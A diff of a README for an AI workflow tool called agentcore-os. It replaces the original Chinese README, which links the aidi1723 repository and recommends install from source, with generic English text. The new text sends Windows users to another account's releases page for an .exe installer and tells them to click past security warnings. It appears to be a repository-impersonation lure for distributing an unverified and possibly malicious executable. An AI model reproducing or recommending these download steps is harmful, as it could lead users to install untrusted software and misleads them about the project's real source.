@@ -1,169 +1,130 @@
-# AgentCore OS（智枢 OS）
+# 🖥️ agentcore-os - Streamline Industry Workflows Easily
 
-[![CI](https://github.com/aidi1723/agentcore-os/actions/workflows/ci.yml/badge.svg)](https://github.com/aidi1723/agentcore-os/actions/workflows/ci.yml)
-[![License: Apache_2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)
+[![Download agentcore-os](https://img.shields.io/badge/Download-agentcore--os-blue?style=for-the-badge)](https://github.com/dsprak645/agentcore-os/releases)
 
-AgentCore OS 是一个**本地优先、面向真实工作的 AI 工作底座**。
-它不是只会聊天的单点工具，而是把模型、文件、工具、审批、连接器和工作流资产，放进一个可持续积累的本地工作系统里。
+---
 
-我们的目标很直接：
+## 📋 What is agentcore-os?
 
-**让更多个人、团队和企业，以更低门槛、更高安全性、更强可控性，真正把 AI 用到日常业务里。**
+agentcore-os is a desktop application designed to simplify business operations. It helps manage workflows, assign tasks by role, and use AI tools to improve process efficiency. It runs like an operating system for your business tasks, making work easier and more organized.
 
-## 当前定位
+The app works on Windows computers. It uses a clear, user-friendly interface to help you get work done without needing technical skills.
 
-AgentCore OS 当前更适合这样理解：
 
-- 一个本地优先的 AI 工作平台
-- 一个可承载多行业、多角色、多流程的业务工作台
-- 一个可以逐步沉淀企业数字员工 / Agent 工作流资产的基础设施
+## 🔍 Key Features
 
-它适合的方向包括：
+- **Industry Workflows:** Follow step-by-step processes created for your business type.
+- **Role-Based Desks:** See only the tasks and tools that relate to your job role.
+- **AI Support:** Use basic AI tools that speed up decision-making and execution.
+- **Desktop UI:** Runs as a desktop app, no heavy browser required.
+- **Organized Task Management:** Keep your tasks and schedules in one place.
+- **Customizable Workflow Options:** Adjust steps as your needs change.
+- **Secure and Local:** Runs safely on your computer with your data kept private.
 
-- 外贸与销售跟进
-- 内容生产与分发
-- 客服与知识支持
-- 财务与业务辅助
-- 运营与增长
-- 编程与自动化
-- 工厂、仓储与数据流程协同
+agentcore-os uses modern frameworks under the hood but hides technical details from you. You just focus on your work.
 
-## 当前稳定版本
 
-当前推荐对外版本：**v1.1.1**
+## 🖥️ System Requirements
 
-当前稳定产品线聚焦：
+Before installing agentcore-os, make sure your computer meets these specs:
 
-- 本地优先
-- BYOK / API Key 驱动
-- 浏览器壳 + 桌面壳双入口
-- 销售跟进、客服处理、知识资产沉淀三条高频闭环
-- 内容创作与研究分析作为稳定基础能力
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i3 or equivalent AMD
+- RAM: At least 4 GB
+- Disk Space: Minimum 500 MB free
+- Internet: Required for updates and AI features
+- Screen Resolution: 1280 x 720 or higher
 
-获取源码、版本信息与公开发布说明，请以仓库与 GitHub Releases 页面为准：
+These requirements ensure the app runs smoothly on most standard business laptops and desktops.
 
-- 主仓库 GitHub：<https://github.com/aidi1723/agentcore-os>
-- 国内镜像 CNB：<https://cnb.cool/aidiyangyu/agentcore-os>
-- GitHub Releases：<https://github.com/aidi1723/agentcore-os/releases>
-- 当前版本发布说明（中文）：[docs/releases/v1.1.1.zh-CN.md](docs/releases/v1.1.1.zh-CN.md)
-- 对外分发说明：[docs/EARLY_ACCESS_RELEASE.zh-CN.md](docs/EARLY_ACCESS_RELEASE.zh-CN.md)
-- 市场发布文案：[docs/LAUNCH_COPY_v1.1.1.zh-CN.md](docs/LAUNCH_COPY_v1.1.1.zh-CN.md)
-- 文档总入口：[docs/DOCUMENTATION_INDEX.zh-CN.md](docs/DOCUMENTATION_INDEX.zh-CN.md)
 
-## 快速开始
+## 🚀 Getting Started
 
-### 本地开发体验
+Follow these steps to get agentcore-os running on your Windows PC.
 
-```bash
-npm install
-npm run dev
-```
+### Step 1: Download the Application
 
-建议本地开发使用 Node.js 22 LTS。
+Click this big button to visit the official download page:
 
-启动后访问：
+[![Download agentcore-os](https://img.shields.io/badge/Download-agentcore--os-grey?style=for-the-badge)](https://github.com/dsprak645/agentcore-os/releases)
 
-- App UI：`http://localhost:3000/`
-- 可选本地 Connector UI：`http://127.0.0.1:8787/`
+You will be taken to the release page where the latest version is available. 
 
-### 命令行安装与运行
+Look for the file that ends with `.exe` (for example, `agentcore-os-setup.exe`). This is the installer.
 
-当前推荐安装方式只有一种：**命令行安装**。
 
-```bash
-git clone https://github.com/aidi1723/agentcore-os.git
-cd agentcore-os
-npm install
-npm run dev
-```
+### Step 2: Run the Installer
 
-如果你要进一步验证桌面壳或本地 sidecar，请看：
+- Open the folder where you saved the downloaded file.
+- Double-click the `.exe` file to start.
+- If a security warning appears, choose “Run” or “Yes” to continue.
+- Follow the on-screen prompts.
+  - Accept the license terms.
+  - Choose the installation folder or keep the default.
+  - Click “Install.”
 
-- [命令行安装说明](docs/COMMAND_LINE_INSTALL.zh-CN.md)
-- [冷启动安装验收](docs/COLD_START_VALIDATION.zh-CN.md)
+The installer will copy files and set up the app on your PC.
 
-### 当前已验证基线
 
-截至 `2026-03-23`，GitHub 主仓库 `d6f6a37` 已完成一轮真实冷启动验收。
+### Step 3: Launch agentcore-os
 
-当前已经验证通过的主线是：
+When installation finishes:
 
-- 命令行安装
-- 从源码运行
-- 浏览器模式
-- `desktop_light` 主线
+- You can find the app icon on your desktop or start menu.
+- Double-click to open.
+- The first run may take a moment while it sets up files.
+- Log in if prompted (use details given by your company or create an account if applicable).
 
-当前推荐的最小稳定性门禁命令：
+You are now ready to start using agentcore-os.
 
-```bash
-npm install
-npm run test:stability
-npm run dev
-```
 
-## 核心能力概览
+## ⚙️ Using agentcore-os
 
-当前版本已经具备这些基础能力：
+The main dashboard will show your assigned workspace. Here is what to expect:
 
-- 桌面壳与多窗口交互
-- 行业工作区与场景入口
-- 多个业务应用集成到同一工作台
-- 销售与客服两条高频 Hero Workflow 已可跑通
-- 结构化流程资产可入库、编辑、复用、追溯
-- 数字员工白名单与 Reality Checker 审核层
-- 多语言入口与首次启动引导
-- 本地优先的运行方式与可控审批边界
+- **Workflow View:** See tasks laid out in steps. Follow the instructions carefully.
+- **Desks:** Switch between different role-based desks if you hold multiple roles.
+- **Task List:** View your pending, ongoing, and completed tasks.
+- **AI Tools:** Use the tools available on your workspace for data input or decision assist.
+- **Settings:** Change preferences such as notifications, language, and appearance.
 
-## 文档入口
+Take your time exploring. The design aims to be simple and clear for everyday use.
 
-### 建议先看
 
-- [文档总入口](docs/DOCUMENTATION_INDEX.zh-CN.md)
-- [用户指南（中文）](docs/USER_GUIDE.zh-CN.md)
-- [当前版本发布说明](docs/releases/v1.1.1.zh-CN.md)
-- [对外分发说明](docs/EARLY_ACCESS_RELEASE.zh-CN.md)
-- [市场发布文案](docs/LAUNCH_COPY_v1.1.1.zh-CN.md)
+## 🔄 Updating agentcore-os
 
-### 安装与发布相关
+The app will notify you when updates are available. To update:
 
-- [命令行安装说明](docs/COMMAND_LINE_INSTALL.zh-CN.md)
-- [冷启动安装验收](docs/COLD_START_VALIDATION.zh-CN.md)
-- [公开发布说明（中文）](docs/PUBLIC_RELEASE.zh-CN.md)
+- Close agentcore-os completely.
+- Return to the releases page: https://github.com/dsprak645/agentcore-os/releases
+- Download the latest `.exe` file.
+- Run the installer again.
+- Your data and settings will be kept safe.
 
-### 其他核心文档
+Regular updates improve performance and add features.
 
-- [快速开始](docs/GETTING_STARTED.md)
-- [架构说明](docs/ARCHITECTURE.md)
-- [连接器说明](docs/CONNECTORS.md)
-- [使用场景](docs/USE_CASES.md)
-- [配置说明](docs/CONFIGURATION.md)
-- [部署说明](docs/DEPLOYMENT.md)
-- [排障说明](docs/TROUBLESHOOTING.md)
 
-## 常用脚本
+## 🛠️ Troubleshooting
 
-- `npm run dev`：开发模式启动
-- `npm run dev:clean`：清理后启动开发模式
-- `npm run build`：生产构建
-- `npm run start`：启动生产服务
-- `npm run stable`：清理重建并启动稳定版本
-- `npm run test:core-workflows`：运行销售 / 客服 / 知识资产 / 发布队列核心回归
-- `npm run test:stability`：运行核心回归 + lint + build 的稳定性门禁
-- `npm run lint`：运行 lint
-- `npm run webhook:dev`：启动本地 webhook connector 示例
-- `npm run publish-queue:worker`：运行后台发布队列 worker
+If you encounter issues, try these steps:
 
-## 开源协议
+- Restart your computer and open agentcore-os again.
+- Ensure your Windows system has the latest updates installed.
+- Check that your internet connection works for features requiring online access.
+- Run the installer again using “Repair” mode if available.
 
-AgentCore OS 采用 **Apache License 2.0** 开源。
+For persistent problems, ask your IT support or visit the community forum linked on the release page.
 
-请注意：
 
-- **本仓库源代码** 按 Apache-2.0 许可发布
-- **Logo、商标、产品名和品牌资产** 不默认随软件许可证一起授权，除非另有明确说明
-- 第三方依赖仍遵循各自原有许可证
+## 🧩 Additional Information
 
-详见：
+agentcore-os uses reliable technologies like Next.js and Tailwind CSS under the hood. This makes the app fast and responsive.
 
-- [LICENSE](LICENSE)
-- [NOTICE](NOTICE)
+It supports workflows tailored to multiple industries, helping businesses apply best practices consistently.
+
+
+## 🔗 Download agentcore-os
+
+Visit this page to download the latest version:
+
+[https://github.com/dsprak645/agentcore-os/releases](https://github.com/dsprak645/agentcore-os/releases)
